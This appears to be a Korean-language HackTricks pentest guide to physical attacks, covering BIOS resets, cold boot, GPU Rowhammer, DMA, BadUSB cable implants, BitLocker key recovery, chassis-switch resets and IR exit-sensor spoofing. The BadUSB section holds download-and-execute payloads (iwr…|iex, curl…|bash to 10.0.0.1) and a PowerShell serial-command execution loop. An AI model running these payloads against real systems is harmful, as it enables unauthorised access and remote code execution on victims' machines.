# 물리적 공격

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

Legacy PC firmware 설정은 CMOS 배터리를 분리하거나 문서화된 clear-CMOS 점퍼를 사용하여 초기화할 수 있습니다. 필요한 전원 차단 시간은 보드마다 다르며, 최신 UEFI password 또는 key는 비휘발성 flash, embedded controller 또는 security device에 저장될 수 있으므로 배터리를 제거해도 유지될 수 있습니다. 핀을 단락시키기 전에 보드/service manual을 확인하십시오. 이 절차는 TPM 측정값을 무효화하고 disk-encryption recovery를 트리거할 수도 있습니다.

Legacy x86 시스템에서는 **killCMOS** 및 **CmosPwd**와 같은 도구를 bootable environment에서 사용하여 CMOS 기반 설정을 검사하거나 변경할 수 있습니다. CmosPwd는 문서화된 구형 BIOS 제품군의 password 형식을 인식하며 CMOS 상태를 백업, 복원 또는 삭제/kill할 수 있습니다. 공개된 build는 legacy DOS/Windows, Linux, FreeBSD 및 NetBSD environment를 대상으로 합니다.<sup>[[18]](#references)</sup> 이러한 utility는 일반적인 UEFI password remover가 아니며 충분한 hardware/firmware access가 필요합니다.

일부 laptop firmware는 password를 여러 번 잘못 입력한 후 vendor별 challenge code를 표시합니다. [bios-pw.org](https://bios-pw.org)와 같은 database는 일부 model에서 legacy vendor recovery password를 도출할 수 있지만, 많은 시스템은 도출 가능한 challenge 없이 lockout을 구현합니다. 생성된 password는 model-specific으로 취급하고 영구적인 attempt counter를 소진하지 않도록 하십시오.

### UEFI Security

최신 **UEFI** 시스템의 경우 CHIPSEC을 사용하여 Secure Boot variable 보호를 감사할 수 있습니다. 먼저 아래의 비수정 검사를 실행하십시오. 선택 사항인 `-a modify` mode는 variable을 의도적으로 손상시키므로 복구 가능한 lab system에서만 사용해야 합니다. CHIPSEC 자체도 privileged driver와 low-level hardware access가 production endpoint에 적합하지 않다고 경고합니다.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM Analysis 및 Cold Boot Attacks

DRAM은 refresh가 중단되어도 모든 bit가 즉시 손실되지는 않는다. decay rate는 module technology와 temperature에 따라 크게 달라지며, cooling을 사용하면 냉각하지 않은 power cycle보다 훨씬 오래 유용한 data를 보존할 수 있다. cold-boot attack은 작은 acquisition environment로 빠르게 reboot하거나 냉각된 module을 옮기고, raw memory를 capture한 다음 bit decay에도 불구하고 cryptographic key를 재구성한다. disk-copy utility가 자동으로 physical-memory imager가 되는 것은 아니며, Volatility는 capture를 acquire하는 것이 아니라 분석한다. platform에 맞고 검증된 acquisition tool을 사용하라.<sup>[[12]](#references)</sup>

---

## Page Table을 대상으로 하는 GPU Rowhammer

Modern GPU Rowhammer attack은 일반 buffer 대신 **GPU virtual-memory metadata**를 대상으로 할 때 훨씬 유용해진다. **GDDR6 NVIDIA Ampere GPU**에 관한 최신 연구는 권한이 없는 CUDA code를 실행하는 attacker가 GPU-specific hammering pattern을 만들고, **memory massaging**을 사용해 paging structure를 취약한 row에 배치한 다음, **last-level page table** 또는 중간 **page directory**의 bit를 flip할 수 있음을 보여준다. 하나의 translation entry가 손상되면 attacker는 **arbitrary GPU memory read/write**를 bootstrap한 다음 host compromise로 pivot할 수 있다.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6에서 **hammerable row를 profile**하고, in-DRAM mitigation을 우회하는 refresh-aware / non-uniform hammering pattern을 구축한다.
2. **GPU allocation을 massage**하여 driver가 page-translation structure를 기본 protected pool에 유지하는 대신 hammerable physical location에 배치하도록 한다. 실제로는 low-memory page-table region을 고갈시키고 controlled stride를 사용해 large sparse UVM mapping을 spraying하는 방식이 될 수 있다.
3. Page-table / page-directory entry 내부의 **PFN** 또는 aperture-related bit와 같은 **translation metadata를 flip**하여 attacker-controlled virtual page가 page-table page, arbitrary GPU memory 또는 host-visible system mapping으로 resolve되도록 한다.
4. 위조된 mapping을 재사용해 추가 translation entry를 rewrite하고, GPU context 전반에서 **arbitrary GPU memory read/write**로 escalate한다.

### Host Pivot 및 Mitigations

- **IOMMU가 비활성화**되어 있으면 위조된 system-aperture mapping이 임의의 **host physical memory**를 GPU에 노출할 수 있으며, 이로 인해 GPU primitive가 full host compromise로 이어진다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**는 last-level page-table entry를 대상으로 하는 반면, **GeForge**는 하나의 bit flip만으로 더 큰 translation subtree를 재지정할 수 있으므로 page-directory level을 손상하는 것이 더 쉬울 수 있음을 보여준다. 하나의 paging layer만 security-critical하다고 간주하지 말라.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**는 GDDRHammer/GeForge가 사용하는 direct arbitrary-host-memory path를 차단하므로 여전히 중요하지만, **complete mitigation은 아니다**. **GPUBreach**는 attacker가 GPU-writable 및 driver-owned CPU buffer를 손상시킨 다음 NVIDIA driver memory-safety bug를 trigger하여 kernel write primitive와 **root shell**을 획득하는 second-stage pivot을 보여준다. IOMMU가 활성화되어 있어도 가능하다.<sup>[[3]](#references)</sup>
- 지원되는 workstation/server GPU에서는 **system-level ECC**가 실용적인 hardening step이다. ECC가 없는 consumer GPU는 더 취약한 defense surface를 노출한다.<sup>[[4]](#references)</sup>
- 이러한 attack은 순전히 이론적인 것이 아니다. **GeForge**는 RTX 3060에서 **1,171**개의 bit flip을, RTX A6000에서 **202**개의 bit flip을 보고했으며, 이는 동작하는 host-privilege-escalation chain을 구축하기에 충분했다.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

pre-boot IOMMU enforcement를 downgrade하고 Windows DMA chain을 활성화할 수 있는 offline UEFI IFR/NVRAM patching에 대해서는 다음을 참조하라.

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**은 FireWire 및 초기 Thunderbolt configuration과 같은 interface를 통해 **DMA-based memory acquisition and patching**을 수행하는 방법을 보여주며, historical login-bypass signature도 포함한다. 이는 단순히 “Windows 10에서 ineffective”한 것이 아니다. exploitability는 interface, target build, IOMMU policy, lock state, 그리고 Windows Kernel DMA Protection이 지원되고 활성화되어 있는지에 따라 달라진다. Windows 10 version 1803 이상에서는 호환 platform에 Kernel DMA Protection이 도입되어 attack surface가 크게 변경되었다.<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access를 위한 Live CD/USB

암호화되지 않았거나 이미 unlock된 Windows volume에서는 offline environment가 **sethc.exe** 또는 **Utilman.exe**와 같은 accessibility binary를 **cmd.exe**로 교체할 수 있으며, 이에 따라 해당 logon-screen shortcut이 실행될 때 SYSTEM command prompt를 얻을 수 있다. **chntpw**와 같은 tool은 local SAM account data를 편집할 수 있다. 이러한 method는 locked BitLocker volume을 bypass하지 못하며 DPAPI/EFS로 보호되는 credential을 손상시킬 수 있다. forensic copy와 backup을 보존하라.

**Kon-Boot**는 지원되는 Windows/macOS configuration을 위한 commercial boot-time authentication-bypass tool이다. compatibility는 OS, firmware mode, Secure Boot 및 disk-encryption setup에 따라 달라지며, BitLocker-locked volume을 decrypt하지는 않는다.<sup>[[10]](#references)</sup>

---

## Windows Security Feature 처리

### Boot 및 Recovery Shortcut

- **Delete/Supr**, F2, F10 또는 다른 vendor key를 누르면 firmware setup이 열릴 수 있다.
- **F8**은 해당 경로가 활성화된 configuration에서만 legacy Windows advanced boot option으로 진입한다. 현재 recovery entry 방식은 configuration에 따라 다르다.
- **Shift**를 누르고 있으면 일부 configuration에서 Windows automatic logon을 억제할 수 있지만, policy/registry setting으로 해당 동작을 비활성화할 수 있다.<sup>[[17]](#references)</sup>

### BAD USB Device

**USB Rubber Ducky** 및 Teensy board와 같은 device는 trusted HID keyboard로 enumerate되고 미리 정의된 keystroke를 inject할 수 있다. payload는 처음에 logged-on session의 privilege와 desktop access를 가진다. UAC prompt, screen locking, keyboard layout, timing 및 endpoint USB policy는 여전히 이를 제한한다.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator 또는 backup privilege가 있으면 shadow copy를 생성하거나 registry hive를 저장하여 **SAM** 및 **SYSTEM**과 같은 locked file을 acquire할 수 있다. 이는 post-compromise collection technique이지 privilege bypass가 아니며, `diskshadow`/VSS 및 registry-hive export event와 상관 분석해야 한다.

## BadUSB / HID Implant Technique

### Wi-Fi managed cable implant

- **Evil Crow Cable Wind**와 같은 ESP32-S3 based implant는 USB-A→USB-C 또는 USB-C↔USB-C cable 내부에 숨겨져 순수하게 USB keyboard로 enumerate되며, Wi-Fi를 통해 C2 stack을 노출한다. Operator는 victim host에서 cable에 전원만 공급하고, password가 `123456789`인 `Evil Crow Cable Wind`라는 hotspot을 생성한 다음 [http://cable-wind.local/](http://cable-wind.local/) 또는 해당 DHCP address로 이동하여 embedded HTTP interface에 접근하면 된다.<sup>[[8]](#references)</sup>
- Browser UI는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* 및 *Config* tab을 제공한다. 저장된 payload에는 OS별 tag가 지정되고, keyboard layout은 즉시 전환되며, VID/PID string은 알려진 peripheral을 흉내 내도록 변경할 수 있다.
- C2가 cable 내부에 존재하므로 phone으로 payload를 stage하고 execution을 trigger하며 Wi-Fi credential을 관리할 수 있다. 조직의 network를 사용하지 않아도 되므로 짧은 dwell-time의 physical intrusion에 유용하다.

### OS-aware AutoExec payload

- AutoExec rule은 하나 이상의 payload를 USB enumeration 직후 실행되도록 연결한다. implant는 가벼운 OS fingerprinting을 수행하고 일치하는 script를 선택한다.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 실행이 unattended로 이루어지므로 charging cable만 교체해도 logged-on user context에서 “plug-and-pwn” initial access를 확보할 수 있다.

### Wi-Fi TCP를 통한 HID-bootstrapped remote shell

1. **Keystroke bootstrap:** 저장된 payload가 console을 열고 새 USB serial device로 수신되는 모든 내용을 실행하는 loop를 paste한다. 최소한의 Windows variant는 다음과 같다:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant는 USB CDC channel을 열린 상태로 유지하면서 ESP32-S3가 operator에게 TCP client(Python script, Android APK 또는 desktop executable)를 연결합니다. TCP session에 입력된 모든 바이트는 위의 serial loop로 전달되므로, air-gapped host에서도 remote command execution이 가능합니다. Output에는 제한이 있으므로 operator는 일반적으로 blind command(account creation, 추가 tooling staging 등)를 실행합니다.

### HTTP OTA update surface

- 문서화된 Evil Crow Cable Wind interface는 `/update`에서 unauthenticated firmware-update endpoint를 노출합니다:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operator는 케이블을 열지 않고도 교전 중에 기능을 hot-swap할 수 있습니다(예: flash USB Army Knife firmware). 이를 통해 implant를 대상 host에 계속 연결한 상태로 새로운 기능으로 전환할 수 있습니다.

## BitLocker Encryption 우회

실행 중이거나 최근에 실행된 시스템에서 승인된 forensic acquisition을 수행하면 volume이 잠금 해제된 동안 BitLocker volume master key 또는 관련 key material이 포함될 수 있습니다. Elcomsoft Forensic Disk Decryptor 및 Passware Kit Forensic과 같은 상용 도구는 지원되는 memory image, hibernation file 또는 crash dump를 검색할 수 있지만, 성공이 보장되지는 않습니다. 최신 Windows는 BitLocker가 활성화된 경우 crash dump도 암호화하며, 저장된 48자리 recovery password는 memory에 있는 volume key와는 다른 artifact입니다.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key 추가를 위한 Social Engineering

공격자가 administrator를 설득하여 BitLocker-management command를 실행하게 만들면 recovery-password, external-key 또는 기타 protector를 추가한 다음 이를 탈취할 수 있습니다. Recovery password는 임의의 0 문자열일 수 없습니다. BitLocker numerical recovery password는 검증된 48자리 형식을 사용합니다. 관련 authorized-administration syntax는 `manage-bde -protectors -add C: -recoverypassword`이며, 생성된 protector는 `manage-bde -protectors -get C:`로 나열할 수 있습니다. Protector 추가를 모니터링하고 새로운 recovery material이 승인된 위치에만 escrow되도록 해야 합니다.<sup>[[16]](#references)</sup>

---

## Chassis Intrusion / Maintenance Switch를 악용하여 BIOS를 Factory-Reset하기

많은 최신 laptop과 small-form-factor desktop에는 Embedded Controller (EC)와 BIOS/UEFI firmware가 모니터링하는 **chassis-intrusion switch**가 포함되어 있습니다. 이 switch의 주된 목적은 장치가 열릴 때 alert를 발생시키는 것이지만, 일부 vendor는 switch가 특정 pattern으로 전환될 때 실행되는 **undocumented recovery shortcut**을 구현하기도 합니다.<sup>[[5]](#references)[[6]](#references)</sup>

### Attack 동작 방식

1. Switch는 EC의 **GPIO interrupt**에 연결되어 있습니다.
2. EC에서 실행되는 firmware는 **press의 timing과 횟수**를 추적합니다.
3. hard-coded pattern이 인식되면 EC는 **system NVRAM/CMOS의 내용을 삭제**하는 *mainboard-reset* routine을 호출합니다.
4. 다음 boot에서 영향을 받는 model은 reset된 firmware state를 로드합니다. Vendor와 revision에 따라 삭제된 state에는 supervisor password, custom boot setting 또는 enrolled Secure Boot key가 포함될 수 있으며, TPM state와 disk-encryption의 영향은 별도로 평가해야 합니다.

> Firmware reset은 external-boot option을 복원할 수 있지만 storage를 **복호화하지는 않습니다**. BitLocker 또는 다른 full-disk encryption system은 TPM/firmware 변경 후 recovery 상태로 전환될 수 있으며, recovery key가 없으면 internal drive를 계속 보호합니다.<sup>[[16]](#references)</sup>

### Real-World Example – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen)의 recovery shortcut은 다음과 같습니다:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
10번째 cycle이 끝나면 EC는 다음 reboot 시 BIOS가 NVRAM을 삭제하도록 지시하는 flag를 설정합니다. 전체 절차에는 약 40초가 걸리며 **screwdriver 하나만 필요합니다**.<sup>[[5]](#references)</sup>

### 일반적인 Exploitation 절차

1. EC가 실행 중이 되도록 target의 전원을 켜거나 suspend-resume을 수행합니다.
2. 하단 커버를 제거하여 intrusion/maintenance switch를 노출합니다.
3. vendor별 toggle pattern을 재현합니다(documentation, forums를 참조하거나 EC firmware를 reverse-engineer합니다).
4. 다시 조립하고 reboot한 다음, 실제로 변경된 firmware settings와 credentials를 확인합니다.
5. 권한이 있고 external boot가 가능한 경우, controlled live image로 boot합니다. 내부 volume이 정상적으로 unlock되었거나 애초에 encrypted되지 않은 경우, live environment는 credentials와 data를 획득하거나 EFI System Partition을 검사할 수 있습니다. 해당 partition을 수정하여 EFI implant를 설치하는 것은 persistent하고 매우 intrusive하며, Secure Boot, measured boot, firmware write protection 및 endpoint monitoring의 제약을 계속 받습니다. Encrypted storage는 key 또는 recovery material 없이는 접근할 수 없습니다.

### Detection 및 Mitigation

* OS management console에서 chassis-intrusion event를 기록하고 예상하지 못한 BIOS reset과 상관 분석합니다.
* 나사/커버에 **tamper-evident seal**을 사용하여 개봉 여부를 감지합니다.
* 장치를 **물리적으로 통제되는 영역**에 보관합니다. physical access는 full compromise와 같다고 가정해야 합니다.
* 가능한 경우 vendor의 “maintenance switch reset” feature를 비활성화하거나, NVRAM reset에 추가적인 cryptographic authorisation을 요구합니다.

---

## No-Touch Exit Sensor에 대한 Covert IR Injection

### Sensor 특성
- 일반적인 “wave-to-exit” sensor는 근거리 IR LED emitter와 TV remote 방식의 receiver module을 함께 사용하며, 올바른 carrier의 pulse를 여러 번(약 4~10회) 감지한 후에만 logic high를 보고합니다(약 30 kHz).<sup>[[7]](#references)</sup>
- plastic shroud는 emitter와 receiver가 서로를 직접 바라보지 못하게 차단하므로, controller는 검증된 carrier가 가까운 reflection에서 발생했다고 간주하고 door strike를 여는 relay를 구동합니다.
- controller가 target의 존재를 인식하면 outbound modulation envelope가 변경되는 경우가 많지만, receiver는 filter된 carrier와 일치하는 모든 burst를 계속 수락합니다.

### Attack Workflow
1. **Emission profile 캡처** – controller pin에 logic analyser를 연결하여 내부 IR LED를 구동하는 pre-detection 및 post-detection waveform을 모두 기록합니다.
2. **“Post-detection” waveform만 replay** – 기본 emitter를 제거하거나 무시하고, 처음부터 이미 trigger된 pattern으로 external IR LED를 구동합니다. receiver는 pulse count/frequency만 확인하므로 spoof된 carrier를 실제 reflection으로 처리하고 relay line을 assert합니다.
3. **Transmission gate 설정** – carrier를 조정된 burst(예: 수십 밀리초 동안 on, 비슷한 시간 동안 off)로 전송하여 receiver의 AGC 또는 interference handling logic을 saturate하지 않으면서 최소 pulse count를 전달합니다. Continuous emission은 sensor의 감도를 빠르게 낮추어 relay가 작동하지 않게 합니다.

### Long-Range Reflective Injection
- bench LED를 high-power IR diode, MOSFET driver 및 focusing optics로 교체하면 약 6m 거리에서 안정적으로 trigger할 수 있습니다.
- attacker는 receiver aperture에 대한 line-of-sight가 필요하지 않습니다. 유리를 통해 보이는 실내 벽, 선반 또는 door frame을 향해 beam을 조준하면 reflection된 energy가 약 30° field of view로 들어가 close-range hand wave를 모방합니다.
- receiver는 약한 reflection만 예상하므로, 훨씬 강한 external beam도 여러 surface에서 bounce된 후 detection threshold 이상을 유지할 수 있습니다.

### Weaponised Attack Torch
- driver를 상용 flashlight 내부에 넣으면 tool을 평범한 물건처럼 숨길 수 있습니다. visible LED를 receiver의 band에 맞는 high-power IR LED로 교체하고, ATtiny412(또는 유사 MCU)를 추가하여 약 30 kHz burst를 생성하며, MOSFET을 사용해 LED current를 sink합니다.
- telescopic zoom lens는 range/precision을 위해 beam을 좁히고, MCU control 하의 vibration motor는 visible light를 방출하지 않고 modulation이 활성화되었음을 haptic으로 확인하게 합니다.
- 여러 저장된 modulation pattern(약간씩 다른 carrier frequency와 envelope)을 순환하면 rebranded sensor family 전반의 compatibility가 높아지므로, operator는 relay가 audible click을 내고 door가 열릴 때까지 reflective surface를 차례로 sweep할 수 있습니다.

---

## References

- [1] [GDDRHammer: 최신 GPU에서의 Component 간 Rowhammer Attack — DRAM Row를 크게 교란하기](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: 재미와 수익을 위한 GDDR Memory Hammering 및 GPU Page Table 위조](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer를 사용한 GPU Privilege Escalation Attack](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Covert IR Torch를 사용한 IR No-Touch Exit Sensor 우회”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind를 사용한 Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chip에 대한 Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot 공식 documentation 및 compatibility 정보](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Key에 대한 Cold Boot Attack](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA를 통한 physical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
